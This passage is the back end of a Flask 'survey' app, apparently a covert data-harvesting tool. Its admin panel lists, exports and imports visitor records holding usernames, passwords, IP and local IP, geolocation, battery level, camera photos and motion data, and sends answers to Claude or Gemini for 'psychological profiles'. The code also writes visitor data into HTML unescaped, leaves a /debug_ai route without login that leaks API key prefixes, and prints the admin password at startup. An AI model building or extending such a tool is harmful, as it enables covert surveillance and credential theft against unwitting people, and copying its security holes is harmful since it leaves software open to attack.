            ai_html = f'<button class="btn accent" style="font-size:.8rem" onclick="genProfile({e["id"]},this)">Generovat profil</button>'
        else:
            ai_html = '<span style="color:var(--muted)">AI nedostupne</span>'

        answers_html = ""
        quiz = e.get('quiz') or {}
        timing = e.get('timing') or {}
        step_idx = 0
        for k, v in quiz.items():
            if k == 'restock_prediction': continue
            val = ', '.join(v) if isinstance(v, list) else str(v)
            q_def = next((q for q in cfg.get('questions', []) if q['id'] == k), None)
            lbl = q_def['label'] if q_def else k
            t = float(timing.get(f'qstep_{step_idx}', 0) or 0)
            answers_html += f'<div class="d-card"><div class="d-label">{lbl}</div><div class="d-val">{val}</div><div style="font-size:.7rem;color:var(--muted);margin-top:4px">{t:.1f}s</div></div>'
            step_idx += 1

        table_rows += f"""
<tr onclick="toggleDetail({e['id']})">
  <td onclick="event.stopPropagation()"><input type="checkbox" class="row-chk" value="{e['id']}" onchange="updateBulkBtn()" style="cursor:pointer;transform:scale(1.3)"></td>
  <td class="td-time">{str(e.get('created_at',''))[:19]}</td>
  <td class="td-name">{e.get('username','Anonym') or 'Anonym'}</td>
  <td class="td-loc">{e.get('city','?') or '?'}<br><span style="font-size:.75rem;color:var(--muted)">{e.get('ip','') or ''}</span></td>
  <td style="color:var(--muted);font-size:.8rem">{dev_disp}<br><span style="font-size:.75rem;color:var(--muted)">{e.get('battery','?') or '?'}</span></td>
  <td><span class="badge badge-ok">&#10003; OK</span><br><span style="font-size:.75rem;color:var(--muted)">{tot:.1f}s</span></td>
  <td><button class="btn danger" style="padding:4px 10px;font-size:.8rem" onclick="event.stopPropagation();delOne({e['id']})">&#10005;</button></td>
</tr>
<tr id="dr-{e['id']}" class="detail-row"><td colspan="7">
  <div class="detail-inner">
    <div class="ai-profile-box">
      <div class="ai-profile-title">&#129504; Psychologicky profil AI</div>
      <div id="ai-box-{e['id']}">{ai_html}</div>
    </div>
    <div class="detail-grid">{answers_html}</div>
  </div>
</td></tr>"""

    ai_status = "● AKTIVNI" if HAS_AI else "○ OFFLINE"
    ai_model = "Claude API" if CLAUDE_API_KEY else ("Gemini API" if GEMINI_API_KEY else "Bez AI")

    html = ADMIN_HTML
    html = html.replace('ENTRIES_JSON_PLACEHOLDER', json.dumps(entries, default=str))
    html = html.replace('QS_B64_ADMIN_PLACEHOLDER', qs_b64)
    html = html.replace('HAS_AI_PLACEHOLDER', 'true' if HAS_AI else 'false')
    html = html.replace('CFG_JSON_PLACEHOLDER', json.dumps(cfg))
    html = html.replace('TABLE_PLACEHOLDER', table_rows)
    html = html.replace('KPITOT_PLACEHOLDER', str(len(entries)))
    html = html.replace('CNT_PLACEHOLDER', str(len(entries)))
    html = html.replace('AI_STATUS_PLACEHOLDER', ai_status)
    html = html.replace('AI_MODEL_PLACEHOLDER', ai_model)
    return html

@app.route('/save_settings', methods=['POST'])
def save_settings():
    if not session.get('logged_in'): return "403", 403
    cfg = load_config()
    q_json = request.form.get('questions_json', '[]')
    try: cfg['questions'] = json.loads(q_json)
    except: pass
    if request.form.get('survey_title'): cfg['survey_title'] = request.form.get('survey_title')
    if request.form.get('survey_subtitle') is not None: cfg['survey_subtitle'] = request.form.get('survey_subtitle')
    cfg['login_enabled'] = request.form.get('login_enabled', '1') == '1'
    save_config(cfg)
    return redirect('/admin')

@app.route('/del_one/<int:id>', methods=['POST'])
def del_one(id):
    if not session.get('logged_in'): return "403"
    db = get_db()
    r = db.execute("SELECT cam_photo FROM visits WHERE id=%s", (id,)).fetchone()
    if r and r['cam_photo']:
        try: os.remove(os.path.join(UPLOAD_FOLDER, r['cam_photo']))
        except: pass
    db.execute("DELETE FROM visits WHERE id=%s", (id,))
    db.commit()
    return "OK"

@app.route('/del_multiple', methods=['POST'])
def del_multiple():
    if not session.get('logged_in'): return "403"
    ids = request.json.get('ids', [])
    if ids:
        db = get_db()
        db.execute("DELETE FROM visits WHERE id = ANY(%s)", (ids,))
        db.commit()
    return "OK"

@app.route('/delete_ghosts', methods=['POST'])
def delete_ghosts():
    if not session.get('logged_in'): return "403"
    db = get_db()
    db.execute("DELETE FROM visits WHERE timing_data='{}' OR timing_data IS NULL OR timing_data='null'")
    db.commit()
    return "OK"

@app.route('/nuke_db', methods=['POST'])
def nuke_db():
    if not session.get('logged_in'): return "403"
    db = get_db()
    db.execute("DELETE FROM visits")
    db.commit()
    for f in os.listdir(UPLOAD_FOLDER):
        try: os.remove(os.path.join(UPLOAD_FOLDER, f))
        except: pass
    return "OK"

@app.route('/export_csv')
def export_csv():
    if not session.get('logged_in'): return "403"
    import csv
    from io import StringIO
    si = StringIO()
    cw = csv.writer(si)
    cw.writerow(['ID', 'Uzivatel', 'IP', 'Lokace', 'Zarizeni', 'Baterie', 'Cas', 'Quiz Data'])
    db = get_db()
    for r in db.execute("SELECT * FROM visits").fetchall():
        cw.writerow([r['id'], r['username'], r['ip'], r['city'], r['device'], r['battery'], r['created_at'], r['quiz_data']])
    o = make_response(si.getvalue())
    o.headers["Content-Disposition"] = "attachment; filename=nexus_export.csv"
    o.headers["Content-type"] = "text/csv; charset=utf-8"
    return o

@app.route('/import_db', methods=['POST'])
def import_db():
    if not session.get('logged_in'): return "403", 403
    file = request.files.get('db_file')
    if not file: return "Nebyl vybran soubor", 400
    temp_path = os.path.join(UPLOAD_FOLDER, "temp_import.db")
    file.save(temp_path)
    try:
        conn_imp = sqlite3.connect(temp_path)
        conn_imp.row_factory = sqlite3.Row
        imp_rows = conn_imp.execute("SELECT * FROM visits").fetchall()
        db = get_db()
        imported_count = 0
        for row in imp_rows:
            r = dict(row)
            db.execute('''INSERT INTO visits (username,password,ip,local_ip,city,lat,lon,device,battery,cam_photo,quiz_data,timing_data,motion_data,ai_profile,start_time,created_at,is_partial)
                VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)''',
                (r.get('username'), r.get('password'), r.get('ip'), r.get('local_ip'),
                 r.get('city'), r.get('lat'), r.get('lon'), r.get('device'),
                 r.get('battery'), r.get('cam_photo'), r.get('quiz_data'),
                 r.get('timing_data'), r.get('motion_data'), r.get('ai_profile'),
                 r.get('start_time'), r.get('created_at'), r.get('is_partial', 0)))
            imported_count += 1
        db.commit()
        conn_imp.close()
        os.remove(temp_path)
        return f"Uspesne importovano {imported_count} zaznamu!"
    except Exception as e:
        return f"Chyba: {str(e)}", 500

@app.route('/debug_ai')
def debug_ai():
    result = ask_ai("Rekni ahoj")
    return jsonify({
        "claude_key": CLAUDE_API_KEY[:15] + "..." if CLAUDE_API_KEY else "CHYBI",
        "gemini_key": GEMINI_API_KEY[:15] + "..." if GEMINI_API_KEY else "CHYBI",
        "ai_result": result,
        "has_ai": HAS_AI
    })
# ═══════════════════════════════════════════════════════════════════
#  START
# ═══════════════════════════════════════════════════════════════════
if __name__ == '__main__':
    init_db(app)
    ai_status = "Claude" if CLAUDE_API_KEY else ("Gemini" if GEMINI_API_KEY else "BEZ AI")
    print(f"""
╔══════════════════════════════════════╗
║   NEXUS SURVEY SYSTEM v3.2           ║
║   Port: {PORT:<28} ║
║   AI:   {ai_status:<28} ║
║   Admin heslo: {ADMIN_PASSWORD:<21} ║
╚══════════════════════════════════════╝
""")
    if WAITRESS_AVAILABLE:
        serve(app, host='0.0.0.0', port=PORT, threads=8)
    else:
        app.run(host='0.0.0.0', port=PORT, debug=False)
